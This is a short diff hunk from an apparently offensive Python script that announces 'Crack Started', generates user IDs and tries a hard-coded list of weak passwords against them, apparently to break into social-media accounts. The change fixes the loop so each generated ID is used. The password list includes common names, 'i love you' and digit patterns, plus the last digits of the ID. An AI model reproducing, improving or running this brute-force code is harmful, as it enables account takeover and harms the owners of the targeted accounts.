@@ -291,7 +291,7 @@ def numb():
         print(Markdown("# Crack Started"))
         space()
         for i in user:
-            uid=code+love
+            uid=code+i
             fb=tsg
             pwx = [code,code+love,codex,'banglades','i love you','nusrat','shahin','fatema','hridoy','mababa','@@@###','@#@#@#','405060','708090','445566','778899']
             pwx.append(uid[5:])#back 6
